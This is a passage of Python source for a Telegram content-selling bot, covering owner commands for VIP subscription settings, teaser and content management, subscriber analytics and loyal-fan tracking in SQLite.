    markup.add(types.InlineKeyboardButton("⚙️ VIP Settings", callback_data="vip_settings"))
    markup.add(types.InlineKeyboardButton("📊 VIP Analytics", callback_data="vip_analytics"))
    markup.add(types.InlineKeyboardButton("🎬 VIP Teasers", callback_data="vip_teasers_management"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(message.chat.id, dashboard_text, reply_markup=markup, parse_mode='HTML')

def show_vip_add_content_interface(chat_id):
    """Show interface for adding new VIP content"""
    add_text = """
💎 <b>ADD VIP CONTENT</b> 💎

VIP content is exclusive to subscribers and generates more revenue.

📝 <b>Enhanced Upload Process:</b>
• Upload files directly from your device
• Custom naming with smart defaults  
• Optional descriptions
• Instant VIP content creation

💡 <b>VIP Benefits:</b>
• VIP members get FREE access to all VIP content
• Higher revenue potential through subscriptions  
• Exclusive feeling increases loyalty
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📤 Start VIP Upload", callback_data="start_vip_upload"))
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
    
    bot.send_message(chat_id, add_text, reply_markup=markup, parse_mode='HTML')

def show_vip_content_management(chat_id):
    """Show VIP content management interface"""
    vip_content = get_vip_content_list()
    
    if not vip_content:
        empty_text = """
💎 <b>VIP CONTENT MANAGEMENT</b> 💎

📭 <b>No VIP content found!</b>

Add your first VIP content to start earning premium subscription revenue.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📦 Add VIP Content", callback_data="vip_add_content"))
        markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    content_text = """
💎 <b>VIP CONTENT MANAGEMENT</b> 💎

🎯 <b>Your VIP Content:</b>

"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for i, (name, price, file_path, description, created_date) in enumerate(vip_content[:10]):
        # Format creation date
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%b %d")
        except:
            formatted_date = "N/A"
        
        # Truncate long descriptions
        short_desc = description[:30] + "..." if len(description) > 30 else description
        
        content_text += f"<b>{i+1}. {name}</b>\n"
        content_text += f"   💰 {price} Stars | 📅 {formatted_date}\n"
        content_text += f"   📝 {short_desc}\n\n"
        
        # Add management buttons
        markup.add(types.InlineKeyboardButton(f"✏️ Edit {name}", callback_data=f"vip_edit_{name}"))
        markup.add(types.InlineKeyboardButton(f"🗑️ Delete {name}", callback_data=f"vip_delete_{name}"))
    
    if len(vip_content) > 10:
        content_text += f"... and {len(vip_content) - 10} more items\n\n"
    
    content_text += "💡 <b>Tip:</b> VIP members get FREE access to all this content!"
    
    markup.add(types.InlineKeyboardButton("➕ Add More VIP Content", callback_data="vip_add_content"))
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
    
    bot.send_message(chat_id, content_text, reply_markup=markup, parse_mode='HTML')

def show_vip_settings_interface(chat_id):
    """Show VIP settings management interface"""
    vip_price = get_vip_settings('vip_price_stars') or '399'
    vip_duration = get_vip_settings('vip_duration_days') or '30'
    vip_description = get_vip_settings('vip_description') or 'Premium VIP access'
    
    settings_text = f"""
⚙️ <b>VIP SETTINGS</b> ⚙️

📋 <b>Current VIP Configuration:</b>

💰 <b>Price:</b> {vip_price} Stars
⏰ <b>Duration:</b> {vip_duration} days  
📝 <b>Description:</b> {vip_description}

🔧 <b>Interactive Settings:</b>
Use the buttons below for guided setup, or use manual commands:

<b>Manual Commands:</b>
• <code>/owner_set_vip_price [amount]</code>
• <code>/owner_set_vip_duration [days]</code>  
• <code>/owner_set_vip_description [text]</code>

💡 <b>Pricing Tips:</b>
• Range: 1 - 150,000 Stars (399 current default)
• 399 Stars ≈ $4 USD | 1,000 Stars ≈ $10 USD
• Higher price = more exclusive feeling
• 30-day duration balances value and recurring revenue
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # Add interactive setting buttons
    markup.add(types.InlineKeyboardButton("💰 Set VIP Price", callback_data="vip_set_price_btn"))
    markup.add(types.InlineKeyboardButton("⏰ Set Duration", callback_data="vip_set_duration_btn"))  
    markup.add(types.InlineKeyboardButton("📝 Set Description", callback_data="vip_set_description_btn"))
    
    # Navigation
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
    
    bot.send_message(chat_id, settings_text, reply_markup=markup, parse_mode='HTML')

def show_vip_analytics(chat_id):
    """Show VIP analytics dashboard"""
    # Get VIP statistics
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    
    # Active VIP subscribers
    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')
    active_vips = cursor.fetchone()[0]
    
    # Total VIP revenue (all time)
    vip_price = int(get_vip_settings('vip_price_stars') or 399)
    cursor.execute('SELECT SUM(total_payments) FROM vip_subscriptions')
    total_payments = cursor.fetchone()[0] or 0
    total_vip_revenue = total_payments * vip_price
    
    # Top VIP subscribers
    cursor.execute('''
        SELECT vs.user_id, u.first_name, u.username, vs.total_payments, vs.expiry_date
        FROM vip_subscriptions vs
        LEFT JOIN users u ON vs.user_id = u.user_id
        WHERE vs.is_active = 1
        ORDER BY vs.total_payments DESC
        LIMIT 5
    ''')
    top_vips = cursor.fetchall()
    
    conn.close()
    
    analytics_text = f"""
📊 <b>VIP ANALYTICS DASHBOARD</b> 📊

💎 <b>VIP Statistics:</b>
• Active Subscribers: {active_vips}
• Total VIP Revenue: {total_vip_revenue:,} Stars
• Average Revenue per VIP: {(total_vip_revenue // max(active_vips, 1)):,} Stars

🏆 <b>Top VIP Subscribers:</b>
"""
    
    if top_vips:
        for i, (user_id, first_name, username, payments, expiry) in enumerate(top_vips):
            safe_first_name = (first_name or "N/A").replace('<', '&lt;').replace('>', '&gt;')
            safe_username = username or "none"
            
            # Calculate days left
            try:
                expiry_date = datetime.datetime.fromisoformat(expiry)
                days_left = (expiry_date - datetime.datetime.now()).days
                status = f"{days_left}d left" if days_left > 0 else "Expired"
            except:
                status = "Unknown"
            
            analytics_text += f"{i+1}. {safe_first_name} (@{safe_username})\n"
            analytics_text += f"   💰 {payments} payments | ⏰ {status}\n\n"
    else:
        analytics_text += "No VIP subscribers yet.\n\n"
    
    analytics_text += """
💡 <b>Growth Tips:</b>
• Add more exclusive VIP content
• Promote VIP benefits in teasers
• Offer limited-time VIP discounts
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
    
    bot.send_message(chat_id, analytics_text, reply_markup=markup, parse_mode='HTML')

def show_vip_teasers_management(chat_id):
    """Show VIP teasers management interface"""
    vip_teasers = get_vip_teasers_with_id()
    vip_teaser_count = len(vip_teasers)
    
    management_text = f"""
🎬 <b>VIP TEASERS MANAGEMENT</b> 🎬

📝 <b>What are VIP Teasers?</b>
VIP teasers are exclusive preview content shown only to your VIP members when they use the /teaser command. These special teasers help VIP members feel extra valued and give them exclusive glimpses of your premium content.

📊 <b>Current Status:</b>
• VIP Teasers: {vip_teaser_count}
• Regular Teasers: Available separately

💡 <b>VIP Teaser Strategy:</b>
• Show more revealing/intimate content than regular teasers
• Make VIP members feel special and appreciated
• Use high-quality photos/videos only
• Keep descriptions engaging and personal

🎯 <b>Management Options:</b>
Choose an action below to manage your VIP teasers.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📤 Upload VIP Teaser", callback_data="vip_teaser_upload"))
    
    if vip_teaser_count > 0:
        markup.add(types.InlineKeyboardButton(f"🗑️ Delete VIP Teaser ({vip_teaser_count})", callback_data="vip_teaser_delete"))
        markup.add(types.InlineKeyboardButton(f"✏️ Edit VIP Teaser ({vip_teaser_count})", callback_data="vip_teaser_edit"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Dashboard", callback_data="cmd_vip"))
    
    bot.send_message(chat_id, management_text, reply_markup=markup, parse_mode='HTML')

def start_vip_teaser_upload_session(chat_id, user_id):
    """Start guided VIP teaser upload session"""
    if user_id != OWNER_ID:
        bot.send_message(chat_id, "❌ Access denied. This is an owner-only command.")
        return
    
    # Initialize VIP teaser upload session with dedicated key
    teaser_key = f"{OWNER_ID}_vip_teaser"
    upload_sessions[teaser_key] = {
        'type': 'vip_teaser',
        'step': 'waiting_for_file',
        'data': {}
    }
    
    upload_text = """
🎬 <b>VIP TEASER UPLOAD</b> 🎬

📤 <b>Step 1: Upload File</b>
Send me the photo or video you want to use as a VIP-exclusive teaser.

💎 <b>VIP Teasers are shown to:</b>
• VIP members only when they use /teaser command
• These replace regular teasers for VIP users

📱 <b>Supported Files:</b>
• Photos (JPG, PNG, etc.)
• Videos (MP4, MOV, AVI)

🎯 <b>VIP Teaser Tips:</b>
• Use higher quality content than regular teasers
• Make it more exclusive/intimate
• Show VIP members what they're getting for their subscription

📂 Just send the photo/video when ready!
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel VIP Teaser Upload", callback_data="vip_teasers_management"))
    
    bot.send_message(chat_id, upload_text, reply_markup=markup, parse_mode='HTML')

def show_vip_teaser_deletion_interface(chat_id):
    """Show VIP teaser deletion interface"""
    vip_teasers = get_vip_teasers_with_id()
    
    if not vip_teasers:
        empty_text = """
🎬 <b>VIP TEASER DELETION</b> 🎬

📭 <b>No VIP teasers found!</b>

You need to upload VIP teasers first before you can delete them.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Upload VIP Teaser", callback_data="vip_teaser_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    delete_text = """
🗑️ <b>DELETE VIP TEASER</b> 🗑️

🎯 <b>Your VIP Teasers:</b>
Select which VIP teaser you want to delete:

"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for teaser_id, file_path, file_type, description, created_date in vip_teasers:
        # Format creation date
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%Y-%m-%d")
        except:
            formatted_date = created_date
        
        # Truncate description for button
        short_desc = description[:30] + "..." if len(description) > 30 else description
        button_text = f"🗑️ {file_type} - {short_desc} ({formatted_date})"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"delete_vip_teaser_{teaser_id}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
    
    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')

def show_vip_teaser_edit_interface(chat_id):
    """Show VIP teaser edit interface"""
    vip_teasers = get_vip_teasers_with_id()
    
    if not vip_teasers:
        empty_text = """
🎬 <b>VIP TEASER EDITING</b> 🎬

📭 <b>No VIP teasers found!</b>

You need to upload VIP teasers first before you can edit them.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Upload VIP Teaser", callback_data="vip_teaser_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    edit_text = """
✏️ <b>EDIT VIP TEASER</b> ✏️

🎯 <b>Your VIP Teasers:</b>
Select which VIP teaser you want to edit (replace photo/video):

"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for teaser_id, file_path, file_type, description, created_date in vip_teasers:
        # Format creation date
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%Y-%m-%d")
        except:
            formatted_date = created_date
        
        # Truncate description for button
        short_desc = description[:30] + "..." if len(description) > 30 else description
        button_text = f"✏️ {file_type} - {short_desc} ({formatted_date})"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"edit_vip_teaser_{teaser_id}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
    
    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')

def start_vip_teaser_edit_session(chat_id, teaser_id):
    """Start VIP teaser edit session"""
    # Get teaser info
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT file_path, file_type, description FROM teasers WHERE id = ? AND vip_only = 1', (teaser_id,))
    teaser = cursor.fetchone()
    conn.close()
    
    if not teaser:
        bot.send_message(chat_id, "❌ VIP teaser not found.")
        return
    
    file_path, file_type, description = teaser
    
    # Initialize edit session
    upload_sessions[OWNERS[0]] = {
        'type': 'vip_teaser_edit',
        'step': 'waiting_for_file',
        'teaser_id': teaser_id,
        'old_file_path': file_path,
        'old_file_type': file_type,
        'old_description': description
    }
    
    edit_text = f"""
✏️ <b>EDIT VIP TEASER</b> ✏️

📝 <b>Current Teaser:</b>
• Type: {file_type.title()}
• Description: {description}

📤 <b>Send New File:</b>
Upload a new photo or video to replace the current teaser content.

💡 <b>Note:</b> This will completely replace the existing file with your new upload.

📱 Just send the new photo/video when ready!
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel Edit", callback_data="vip_teasers_management"))
    
    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')

def show_vip_teasers_collection(chat_id, user_id):
    """Show VIP teasers collection to VIP members"""
    # Check if user is VIP
    vip_status = check_vip_status(user_id)
    
    if not vip_status['is_vip']:
        # Not VIP, show upgrade message
        upgrade_text = """
🚫 <b>VIP TEASERS ACCESS RESTRICTED</b> 🚫

💎 This exclusive teaser collection is only available to VIP members!

🌟 <b>What you're missing:</b>
• Exclusive high-quality teasers
• Behind-the-scenes content
• VIP-only previews
• Premium intimate content

💰 <b>Upgrade to VIP for instant access!</b>
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("🎬 View Free Teasers", callback_data="teasers"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, upgrade_text, reply_markup=markup, parse_mode='HTML')
        return
    
    # User is VIP, show VIP teasers collection
    vip_teasers = get_vip_teasers()
    
    if not vip_teasers:
        empty_text = f"""
🎬 <b>VIP TEASERS COLLECTION</b> 🎬

📭 <b>No VIP teasers available yet!</b>

Don't worry, babe! I'm working on creating exclusive VIP content just for my special members like you.

⏰ Your VIP expires in {vip_status['days_left']} days

💝 In the meantime, enjoy your FREE access to all my premium content!
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🎁 Browse All VIP Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton("🔄 Extend VIP", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    # Show VIP teasers collection
    collection_text = f"""
🎬 <b>VIP TEASERS COLLECTION</b> 🎬

💎 Welcome to your exclusive VIP teaser collection! These special previews are made just for my VIP members.

📊 <b>Your VIP Status:</b>
• VIP Teasers Available: {len(vip_teasers)}
• VIP Expires: {vip_status['days_left']} days

💕 Enjoy these exclusive glimpses into my world, beautiful! Each teaser is crafted with love just for VIPs like you.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for i, (file_path, file_type, description) in enumerate(vip_teasers[:5]):  # Show first 5
        short_desc = description[:30] + "..." if len(description) > 30 else description
        button_text = f"💎 {file_type.title()} - {short_desc}"
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"view_vip_teaser_{i}"))
    
    markup.add(types.InlineKeyboardButton("🎁 Browse All VIP Content", callback_data="browse_content"))
    markup.add(types.InlineKeyboardButton("🔄 Extend VIP", callback_data="vip_access"))
    markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
    
    bot.send_message(chat_id, collection_text, reply_markup=markup, parse_mode='HTML')

def handle_vip_content_deletion(chat_id, content_name):
    """Handle VIP content deletion with confirmation"""
    content = get_vip_content_by_name(content_name)
    
    if not content:
        bot.send_message(chat_id, f"❌ VIP content '{content_name}' not found.")
        return
    
    name, price, file_path, description, created_date = content
    
    confirm_text = f"""
⚠️ <b>CONFIRM VIP CONTENT DELETION</b> ⚠️

You are about to delete:
<b>{name}</b>
💰 Price: {price} Stars
📝 {description}

⚠️ <b>Warning:</b> This action cannot be undone!

Are you sure you want to delete this VIP content?
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"🗑️ Yes, Delete {name}", callback_data=f"confirm_vip_delete_{name}"))
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="vip_manage_content"))
    
    bot.send_message(chat_id, confirm_text, reply_markup=markup, parse_mode='HTML')

def show_vip_content_edit_interface(chat_id, content_name):
    """Show enhanced VIP content edit interface with inline buttons"""
    content = get_vip_content_by_name(content_name)
    
    if not content:
        bot.send_message(chat_id, f"❌ VIP content '{content_name}' not found.")
        return
    
    name, price, file_path, description, created_date = content
    
    # Generate clickable file path if it's a URL
    file_display = ""
    if file_path.startswith(('http://', 'https://')):
        file_display = f"<a href='{file_path}'>🔗 View Current File</a>"
    else:
        # Show truncated file path for file IDs
        file_display = f"📁 {file_path[:50]}{'...' if len(file_path) > 50 else ''}"
    
    edit_text = f"""
✏️ <b>EDIT VIP CONTENT</b> ✏️

<b>Current Details:</b>
• Name: {name}
• Price: {price} Stars  
• Description: {description}
• File: {file_display}

🔧 <b>Quick Edit Commands:</b>
• <code>/owner_edit_vip_price {name} [new_price]</code>
• <code>/owner_edit_vip_description {name} [new_description]</code>
• <code>/owner_edit_vip_file {name} [new_file_path]</code>

💡 <b>Note:</b> Changes take effect immediately for new VIP subscribers.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # Add inline editing buttons
    markup.add(types.InlineKeyboardButton("📁 Upload New File", callback_data=f"vip_upload_file_{name}"))
    
    # Add file path link if it's a URL
    if file_path.startswith(('http://', 'https://')):
        markup.add(types.InlineKeyboardButton("🔗 View Current File", url=file_path))
    
    # Add other editing options
    markup.add(types.InlineKeyboardButton("💰 Edit Price", callback_data=f"vip_edit_price_{name}"))
    markup.add(types.InlineKeyboardButton("📝 Edit Description", callback_data=f"vip_edit_desc_{name}"))
    
    # Navigation only - deletion is handled from main VIP management
    markup.add(types.InlineKeyboardButton("🔙 Back to VIP Content", callback_data="vip_manage_content"))
    
    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML', disable_web_page_preview=False)

@bot.message_handler(commands=['owner_list_vips'])
def owner_list_vips(message):
    """Handle /owner_list_vips command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    
    # Get all active VIP users
    cursor.execute('''
        SELECT u.user_id, u.first_name, u.username, v.start_date, v.expiry_date, v.total_payments
        FROM vip_subscriptions v
        JOIN users u ON v.user_id = u.user_id
        WHERE v.is_active = 1
        ORDER BY v.expiry_date DESC
    ''')
    vip_users = cursor.fetchall()
    
    conn.close()
    
    if vip_users:
        vip_text = "💎 <b>ACTIVE VIP MEMBERS</b> 💎\n\n"
        
        for user_id, first_name, username, start_date, expiry_date, payments in vip_users:
            safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            # Calculate days left
            try:
                expiry_datetime = datetime.datetime.fromisoformat(expiry_date)
                days_left = (expiry_datetime - datetime.datetime.now()).days
                days_text = f"{days_left} days left"
            except:
                days_text = "Invalid date"
            
            vip_text += f"👤 {safe_first_name} (@{safe_username})\n"
            vip_text += f"   ⏰ {days_text} | 💰 {payments} payments\n"
            vip_text += f"   🆔 ID: {user_id}\n\n"
        
        bot.send_message(message.chat.id, vip_text, parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, "💎 No active VIP members yet.")

@bot.message_handler(commands=['owner_set_vip_price'])
def owner_set_vip_price(message):
    """Handle /owner_set_vip_price command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_set_vip_price [price]
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_set_vip_price [price_in_stars]</code>\nExample: <code>/owner_set_vip_price 399</code>", parse_mode='HTML')
            return
        
        new_price = int(parts[1])
        
        if new_price < 1 or new_price > 150000:
            bot.send_message(message.chat.id, "❌ Price must be between 1 and 150,000 Stars.")
            return
        
        # Update VIP price setting
        update_vip_settings('vip_price_stars', str(new_price))
        
        bot.send_message(message.chat.id, f"✅ VIP subscription price updated to {new_price:,} Stars!")
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid price. Please enter a number.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating VIP price: {str(e)}")

@bot.message_handler(commands=['owner_set_vip_duration'])
def owner_set_vip_duration(message):
    """Handle /owner_set_vip_duration command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_set_vip_duration [days]
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_set_vip_duration [days]</code>\nExample: <code>/owner_set_vip_duration 30</code>", parse_mode='HTML')
            return
        
        new_duration = int(parts[1])
        
        if new_duration < 1 or new_duration > 365:
            bot.send_message(message.chat.id, "❌ Duration must be between 1 and 365 days.")
            return
        
        # Update VIP duration setting
        update_vip_settings('vip_duration_days', str(new_duration))
        
        bot.send_message(message.chat.id, f"✅ VIP subscription duration updated to {new_duration} days!")
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid duration. Please enter a number.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating VIP duration: {str(e)}")

@bot.message_handler(commands=['owner_set_vip_description'])
def owner_set_vip_description(message):
    """Handle /owner_set_vip_description command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_set_vip_description [description]
        parts = message.text.split(' ', 1)
        if len(parts) != 2:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_set_vip_description [description]</code>\nExample: <code>/owner_set_vip_description Premium VIP access with exclusive content</code>", parse_mode='HTML')
            return
        
        new_description = parts[1].strip()
        
        if len(new_description) < 5 or len(new_description) > 200:
            bot.send_message(message.chat.id, "❌ Description must be between 5 and 200 characters.")
            return
        
        # Update VIP description setting
        update_vip_settings('vip_description', new_description)
        
        bot.send_message(message.chat.id, f"✅ VIP description updated to: {new_description}")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating VIP description: {str(e)}")

@bot.message_handler(commands=['owner_edit_price'])
def owner_edit_price(message):
    """Handle /owner_edit_price command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_edit_price [content_name] [new_price]
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_edit_price [content_name] [new_price]</code>\nExample: <code>/owner_edit_price photo_set_1 75</code>", parse_mode='HTML')
            return
        
        content_name = parts[1]
        new_price = int(parts[2])
        
        if new_price < 0 or new_price > 150000:
            bot.send_message(message.chat.id, "❌ Price must be between 0 and 150,000 Stars.")
            return
        
        # Update content price
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE content_items SET price_stars = ? WHERE name = ?', (new_price, content_name))
        updated_count = cursor.rowcount
        conn.commit()
        conn.close()
        
        if updated_count > 0:
            bot.send_message(message.chat.id, f"✅ Price for '{content_name}' updated to {new_price:,} Stars!")
        else:
            bot.send_message(message.chat.id, f"❌ Content '{content_name}' not found.")
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid price. Please enter a number.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating price: {str(e)}")

@bot.message_handler(commands=['owner_edit_description'])
def owner_edit_description(message):
    """Handle /owner_edit_description command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_edit_description [content_name] [new_description]
        parts = message.text.split(' ', 2)
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_edit_description [content_name] [new_description]</code>\nExample: <code>/owner_edit_description photo_set_1 Amazing exclusive photo collection</code>", parse_mode='HTML')
            return
        
        content_name = parts[1]
        new_description = parts[2].strip()
        
        if len(new_description) < 5 or len(new_description) > 500:
            bot.send_message(message.chat.id, "❌ Description must be between 5 and 500 characters.")
            return
        
        # Update content description
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE content_items SET description = ? WHERE name = ?', (new_description, content_name))
        updated_count = cursor.rowcount
        conn.commit()
        conn.close()
        
        if updated_count > 0:
            bot.send_message(message.chat.id, f"✅ Description for '{content_name}' updated successfully!")
        else:
            bot.send_message(message.chat.id, f"❌ Content '{content_name}' not found.")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating description: {str(e)}")

@bot.message_handler(commands=['owner_edit_file_path'])
def owner_edit_file_path(message):
    """Handle /owner_edit_file_path command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_edit_file_path [content_name] [new_file_path]
        parts = message.text.split(' ', 2)
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Usage: <code>/owner_edit_file_path [content_name] [new_file_path]</code>\nExample: <code>/owner_edit_file_path photo_set_1 https://example.com/newphoto.jpg</code>", parse_mode='HTML')
            return
        
        content_name = parts[1]
        new_file_path = parts[2].strip()
        
        if len(new_file_path) < 5:
            bot.send_message(message.chat.id, "❌ File path too short. Please provide a valid file path or URL.")
            return
        
        # Update content file path
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE content_items SET file_path = ? WHERE name = ?', (new_file_path, content_name))
        updated_count = cursor.rowcount
        conn.commit()
        conn.close()
        
        if updated_count > 0:
            bot.send_message(message.chat.id, f"✅ File path for '{content_name}' updated successfully!")
        else:
            bot.send_message(message.chat.id, f"❌ Content '{content_name}' not found.")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error updating file path: {str(e)}")

# Loyal Fan Management Functions

def show_mark_loyal_fan_interface(chat_id):
    """Show interface to mark a user as loyal fan"""
    # Get all users (paying customers prioritized)
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, u.interaction_count
        FROM users u
        LEFT JOIN loyal_fans l ON u.user_id = l.user_id
        WHERE l.user_id IS NULL 
            AND u.user_id != ?
            AND (u.username IS NULL OR LOWER(u.username) NOT LIKE '%bot')
        ORDER BY u.total_stars_spent DESC, u.interaction_count DESC
        LIMIT 20
    ''', (OWNER_ID,))
    non_loyal_users = cursor.fetchall()
    conn.close()
    
    if not non_loyal_users:
        empty_text = """
⭐ <b>MARK LOYAL FAN</b> ⭐

📭 <b>All users are already marked as loyal fans!</b>

Or no users found in database yet.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    mark_text = f"""
⭐ <b>MARK LOYAL FAN</b> ⭐

👥 <b>Select a user to mark as loyal fan:</b>

Found {len(non_loyal_users)} user(s) not yet marked as loyal. Top customers shown first:

💡 <b>Tip:</b> Mark your best customers and most engaged fans!
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for user_id, username, first_name, stars_spent, interactions in non_loyal_users:
        # Escape HTML special characters
        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Create button text with user details
        button_text = f"⭐ {safe_first_name} (@{safe_username}) | {stars_spent}⭐ | {interactions} msgs"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"select_loyal_{user_id}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to Loyal Fan Management", callback_data="loyal_fan_management_menu"))
    
    bot.send_message(chat_id, mark_text, reply_markup=markup, parse_mode='HTML')

def show_loyal_fans_list(chat_id):
    """Show all loyal fans with their details"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, 
               l.reason, l.date_marked
        FROM loyal_fans l
        JOIN users u ON l.user_id = u.user_id
        ORDER BY l.date_marked DESC
    ''')
    loyal_fans = cursor.fetchall()
    conn.close()
    
    if not loyal_fans:
        empty_text = """
📋 <b>LOYAL FANS LIST</b> 📋

📭 <b>No loyal fans yet!</b>

Start marking your best customers as loyal fans to track your VIP community.
"""
        markup = types.InlineKeyboardMarkup()
